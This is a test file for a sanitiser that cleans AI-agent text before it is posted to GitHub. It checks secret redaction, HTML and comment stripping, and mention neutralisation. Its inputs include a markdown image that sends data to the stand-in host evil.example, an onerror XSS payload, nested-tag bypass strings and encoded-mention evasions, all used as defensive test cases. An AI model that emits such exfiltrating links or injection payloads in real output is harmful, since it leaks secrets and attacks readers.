import { describe, expect, it } from 'vitest';
import { sanitizeForGithub } from './sanitize';

const clean = (text: string, maxLength = 4000) => sanitizeForGithub(text, { allowedMentions: ['maya', 'Leo'], maxLength });

// A neutralized mention: in backticks, with an invisible zero-width space after the @, so GitHub
// can't read it as a mention even when its backticks get paired with other ones.
const quiet = (name: string) => `\`@\u200B${name}\``;

describe('sanitizeForGithub', () => {
  it.each([
    ['a GitHub token', `token ghp_${'a'.repeat(36)} here`],
    ['a fine-grained GitHub token', `github_pat_${'b'.repeat(30)}`],
    ['an Anthropic key', `sk-ant-api03-${'c'.repeat(40)}`],
    ['an AWS key id', 'AKIAABCDEFGHIJKLMNOP'],
    ['a Nitpilot CLI token', `nit_${'d'.repeat(43)}`],
    ['a private key', '-----BEGIN RSA PRIVATE KEY-----\nMIIE\n-----END RSA PRIVATE KEY-----'],
  ])('redacts %s', (_label, secret) => {
    const out = clean(`before ${secret} after`);
    expect(out).toContain('[redacted]');
    expect(out).not.toContain(secret);
  });

  it('removes HTML comments, so agent text cannot forge our marker', () => {
    expect(clean('ok <!-- nitpilot:v1 chat=x --> done')).toBe('ok  done');
  });

  it('keeps an image only as its alt text', () => {
    expect(clean('see ![diagram](https://evil.example/x.png?data=secret)')).toBe('see diagram');
  });

  it('strips raw HTML tags', () => {
    expect(clean('a <img src=x onerror=alert(1)> b <b>bold</b>')).toBe('a  b bold');
  });

  it('neutralizes mentions of people outside the PR, keeps the ones inside', () => {
    expect(clean('@maya and @leo, also @someone and @acme/team')).toBe(`@maya and @leo, also ${quiet('someone')} and ${quiet('acme/team')}`);
  });

  // GitHub pings any @name not preceded by a letter, digit or underscore, and it decodes HTML
  // entities before it looks, so each of these would still ping @someone.
  it.each([
    ['after a dot', '.@someone', `.${quiet('someone')}`],
    ['after a slash', 'x/@someone', `x/${quiet('someone')}`],
    ['after another @', '@@someone', `@${quiet('someone')}`],
    ['after a lone backtick', '`@someone', `\`${quiet('someone')}`],
    ['after an escaped backtick', '\\`@someone`', `\\\`${quiet('someone')}\``],
    ['written as &#64;', '&#64;someone', quiet('someone')],
    ['written as &#x40;', '&#x40;someone', quiet('someone')],
    ['written as &commat;', '&commat;someone', quiet('someone')],
    ['with an encoded letter', '@&#115;omeone', quiet('someone')],
  ])('neutralizes a mention %s', (_label, input, expected) => {
    expect(clean(input)).toBe(expected);
  });

  it('keeps a neutralized mention quiet when an odd backtick earlier pairs with ours', () => {
    // GitHub pairs the backtick before "foo" with the first one we add, which leaves @ outside code.
    expect(clean('use `foo @someone')).toBe(`use \`foo ${quiet('someone')}`);
  });

  it('leaves emails and code alone', () => {
    expect(clean('mail a@b.com or run `npm i @scope/pkg`')).toBe('mail a@b.com or run `npm i @scope/pkg`');
  });

  it.each([
    ['a comment', '<!-<!-- x -->- nitpilot:v1 chat=x -->', '<!--'],
    ['an unclosed comment', 'hi <!-- nitpilot:v1 chat=x', '<!--'],
    ['a tag', '<<b>img src=https://evil.example/?d=1>', '<img'],
    ['an image', '![a![b](https://x.example)](https://evil.example/?d=1)', 'evil.example'],
  ])('cannot be tricked by nesting into leaving %s behind', (_label, input, leftover) => {
    expect(clean(input)).not.toContain(leftover);
  });

  it('leaves mentions inside a fenced code block alone', () => {
    const block = '```\nnpm i @scope/pkg\n@someone\n```';
    expect(clean(`see\n${block}\nthanks @someone`)).toBe(`see\n${block}\nthanks ${quiet('someone')}`);
  });

  it('cuts long text with an ellipsis', () => {
    const out = clean('x'.repeat(50), 10);
    expect(out).toHaveLength(10);
    expect(out.endsWith('…')).toBe(true);
  });

  // Cutting must never leave a mention that pings someone.
  it.each([
    ['inside a neutralized mention', 'hi @someone', 10, `hi ${quiet('so')}…`],
    ["inside an allowed mention, which would leave a stranger's name", 'hi @maya', 6, 'hi…'],
    ['through a code span, so its @name is no longer code', 'see `npm i @scope/pkg`', 18, `see \`npm i ${quiet('sc')}…`],
  ])('cuts %s safely', (_label, input, maxLength, expected) => {
    const out = clean(input, maxLength);
    expect(out).toBe(expected);
    expect(out.length).toBeLessThanOrEqual(maxLength);
  });
});
